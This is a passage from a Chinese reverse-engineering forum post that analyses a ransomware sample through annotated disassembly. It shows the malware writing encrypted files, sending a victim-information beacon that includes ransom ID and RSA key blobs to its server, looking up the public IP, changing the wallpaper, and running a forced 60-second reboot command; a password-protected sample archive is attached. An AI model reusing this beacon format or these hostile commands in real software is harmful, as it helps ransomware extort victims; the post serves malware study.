
```
01A24374    FF15 8CB1A201   call    dword ptr [1A2B18C]              ; kernel32.SetFilePointerEx
01A2437A    85C0            test    eax, eax
01A2437C    75 06           jnz     short 01A24384
01A2437E    FF15 88B1A201   call    dword ptr [1A2B188]              ; ntdll.RtlGetLastWin32Error
01A24384    6A 00           push    0
01A24386    8D45 E4         lea     eax, dword ptr [ebp-1C]
01A24389    50              push    eax
01A2438A    FF75 F4         push    dword ptr [ebp-C]                0x30
01A2438D    FF75 E0         push    dword ptr [ebp-20]
01A24390    FF75 FC         push    dword ptr [ebp-4]
01A24393    FF15 50B1A201   call    dword ptr [1A2B150]              ; 写文件，第一次
01A24399    85C0            test    eax, eax
01A2439B    75 08           jnz     short 01A243A5
……
01A243D9    FF75 F0         push    dword ptr [ebp-10]
01A243DC    56              push    esi
01A243DD    FF15 50B1A201   call    dword ptr [1A2B150]              ; 写文件，第2次
01A243E3    6A 00           push    0
01A243E5    8D45 E4         lea     eax, dword ptr [ebp-1C]
01A243E8    50              push    eax
01A243E9    68 00010000     push    100                           0x100
01A243EE    FF75 F8         push    dword ptr [ebp-8]
01A243F1    56              push    esi
01A243F2    FF15 50B1A201   call    dword ptr [1A2B150]              ; 写文件，第3次
01A243F8    6A 00           push    0
01A243FA    8D45 E4         lea     eax, dword ptr [ebp-1C]
01A243FD    50              push    eax
01A243FE    6A 08           push    8                              0x8
01A24400    53              push    ebx
01A24401    56              push    esi
01A24402    FF15 50B1A201   call    dword ptr [1A2B150]              ; 写文件，第4次
```

各种信息组合后发送（服务器挂了）

```
01A29065    57              push    edi
01A29066    C745 D4 7300740>mov     dword ptr [ebp-2C], 740073
01A2906D    C745 D8 3A00200>mov     dword ptr [ebp-28], 20003A
01A29074    C745 DC 6300610>mov     dword ptr [ebp-24], 610063
01A2907B    C745 E0 7200640>mov     dword ptr [ebp-20], 640072
01A29082    C745 E4 6500720>mov     dword ptr [ebp-1C], 720065
01A29089    C745 E8 2E00620>mov     dword ptr [ebp-18], 62002E
01A29090    C745 EC 6900740>mov     dword ptr [ebp-14], 740069
01A29097    FF15 60B2A201   call    dword ptr [1A2B260]              ; wininet.HttpAddRequestHeadersW
01A2909D    85C0            test    eax, eax
01A2909F    74 68           je      short 01A29109
01A290A1    FF75 14         push    dword ptr [ebp+14]
01A290A4    FF75 10         push    dword ptr [ebp+10]
01A290A7    FF75 30         push    dword ptr [ebp+30]
01A290AA    FF75 2C         push    dword ptr [ebp+2C]
01A290AD    57              push    edi
01A290AE    FF15 64B2A201   call    dword ptr [1A2B264]              ; wininet.HttpSendRequestW

action=call&ip=220.203.63.51&pc\_user=SYSTEM&pc\_name=JHON-D12B6AC
420&pc\_group=WORKGROUP&pc\_keyb=0&os\_major=Microsoft Windows XP&o
s\_bit=x86&ransom\_id=6aa1d5d1fc51543e&hdd=C:FIXED\_42935926784/244
3919360&id=39&subid=252&pub\_key=BgIAAACkAABSU0ExAAgAAAEAAQDDpqgF
M3VtHyRJ/FUes7Svo00o2v3Tz7d+APzGU8Qcj+xNLmtWc1wsOVcXuGq4SbPFOYY0
YiruTEWNfItKhmtvhZYRh3M+l9IEGo88E62nECKg5Ux1e6E5+5z5vOfd4yUIIoH9
XwdJ189JdDD4Vahk8enJm4IUla+szrRkZSm5W2R8bXrWjXPCAvpI0c4pPCIuYe83
cyF4Zllre0aGbZNKDnttoiWcLqQ8F2bnjtI1ydjxeaVjMeN59uj8dcNxMASV4u1e
rVbeHEnMEU51rtLiOnm1HkHML/OZ3f0Rwd3HAbPMpm0SjSAGv//CHC0l9pOKLArG
qdAd0F+GYlCg/EHE&priv\_key=BwIAAACkAABSU0EyAAgAAAEAAQDDpqgFM3VtHy
RJ/FUes7Svo00o2v3Tz7d+APzGU8Qcj+xNLmtWc1wsOVcXuGq4SbPFOYY0YiruTE
WNfItKhmtvhZYRh3M+l9IEGo88E62nECKg5Ux1e6E5+5z5vOfd4yUIIoH9XwdJ18
9JdDD4Vahk8enJm4IUla+szrRkZSm5W2R8bXrWjXPCAvpI0c4pPCIuYe83cyF4Zl
lre0aGbZNKDnttoiWcLqQ8F2bnjtI1ydjxeaVjMeN59uj8dcNxMASV4u1erVbeHE
nMEU51rtLiOnm1HkHML/OZ3f0Rwd3HAbPMpm0SjSAGv//CHC0l9pOKLArGqdAd0F
+GYlCg/EHE2QeMbry3AVLTWenhei4q3Ke72xI5ogZLOXanetXGRb1AxDP+osKyiF
e9NLxF2WxB9yt869abQoEvm97sQYFyURzRw7US80AHLK13DbwnYwqfw8n+lZO0IH
sgKpz8ggtBEEo4N0Gj+MsxUxpOD72hLteLkGyCYnwNujG7sYjj4eP7fciJd+oExf
evt2KlZnzrLNZ5S7CwYv3V22mJyO5aoPE0Xo8aUYsD8FSpbJRS6o/J3VpEgfc3tR
rZKKTwn/H/7Kv0f8dM2gN2NMqCTGUAQAWS65hoaWUWlXykWEWicdcWr56BIkd5YV
TZvbwRXp9p/zjBCSN7zCnZKr5XLCx53LldC3AwEuA7G1qzAwFFm57ky7FlcyqGT7
U/oUTeLI7a+PH6GqYpkTMeZPX2VtfMW6OIPMAhvC9YoWerzkTxKkzo4A5H082lt/
WU8BJ6cO7yvt50hIMA7bQPTMxQr+uCVitSJPYx/OCy4T8fGGaqW1tk8dsf6Y9EXT
7BM2qqQOVt+YRBrSjiQy/dBD4WogmP25xhjNFRXcucvzuC8YKmY7NRGiohDIhHQg
Gqwt60Szbli6fN0+NLdronb5e5M6AmEYk6mBIoygufiFoZG/DByZTdAYrMQcxYzm
8lac1WaQLUOM7VOPuFt/orj2BKIg27b4bbcR3sBZAWhQ3StdzQwLx7qXo8TZPPzw
57igx0luic1F8gnn8QYWD9p6G0mlwiL4pqN5Gmp3yiEnjQWmBvyyG2ypbxs4tpiw
wtOrUN6nJXk3xpUaS1v4GW1FXQDEulwEVb6EoRK+VcxdunC+bF1KT96xPlxM/UnY
/zxfnXzIEWoSnDcfQamX4kPhfav19rR6GsAq7J2uOCIabEydyWdNBYPjS2XwDMrs
/XaTPi4Ey30tZh47Gmz0AHr4cNuP2sCCKZZPDzkx1RSdLc0p/Y+X/MCf+sGRNpZ7
qqPiKCualdKw6xA0Qk+Bn9tzLvRBisMI6eTOV8tX+n6fyI51hsHdRYotGFkBWqJH
pM8TGoxBbTdxJRyMkbU5AKNRzVU6srgFYgy/VlV2PmZhTRwAQPfZx18S9ZXPfO92
XOxyV0vXef/RkGPivR96zU2wT2fYxy00oSG7Yer/XPz09dPUzl3Wesm/jQTXpy3n
SczLYn1HmDl5vulADzZfImThRaRgO6rn99/JSa7A4MOGsosPCdYRQ=&version=3
.0.0
```

查询公网ip地址

```
01A27C72    57              push    edi
01A27C73    57              push    edi
01A27C74    68 B00BA301     push    1A30BB0                          ; UNICODE "GET"
01A27C79    83EC 08         sub     esp, 8
01A27C7C    8D4D F8         lea     ecx, dword ptr [ebp-8]
01A27C7F    68 FF270000     push    27FF
01A27C84    56              push    esi
01A27C85    57              push    edi
01A27C86    57              push    edi
01A27C87    68 7C10A301     push    1A3107C
01A27C8C    68 8010A301     push    1A31080                          ; UNICODE "ipv4bot.whatismyipaddress.com"
01A27C91    E8 1A130000     call    01A28FB0
```

修改桌面壁纸为`pidor.bmp`

```
01A23EF5    50              push    eax
01A23EF6    68 00010000     push    100
01A23EFB    C74424 38 01000>mov     dword ptr [esp+38], 1
01A23F03    FF15 98B1A201   call    dword ptr [1A2B198]              ; kernel32.GetTempPathW
01A23F09    68 A003A301     push    1A303A0                          ; UNICODE "\pidor.bmp"
01A23F0E    FF36            push    dword ptr [esi]
01A23F10    FF15 30B1A201   call    dword ptr [1A2B130]              ; kernel32.lstrcatW
01A23F16    FF36            push    dword ptr [esi]
01A23F18    8B7424 28       mov     esi, dword ptr [esp+28]
01A23F1C    8BD7            mov     edx, edi
01A23F1E    8BCE            mov     ecx, esi
01A23F20    E8 4BF8FFFF     call    01A23770
```

倒计时60秒关机

```
01A257C1    6A 00           push    0
01A257C3    6A 00           push    0
01A257C5    68 6009A301     push    1A30960                          ; UNICODE "/c shutdown -r -t 60 -f"
01A257CA    68 9009A301     push    1A30990                          ; UNICODE "cmd.exe"
01A257CF    68 F004A301     push    1A304F0                          ; UNICODE "open"
01A257D4    6A 00           push    0
01A257D6    FF15 E4B1A201   call    dword ptr [1
```

附件密码：123

[[招生]科锐逆向工程师培训(2026年11月13日实地，远程教学同时开班, 第57期)](https://bbs.kanxue.com/thread-51839.htm)

最后于  2019-9-9 17:47 被Snow\_s编辑，原因：

上传的附件：

- [相关文件.rar](javascript:void(0);)（2.70MB，118次下载）
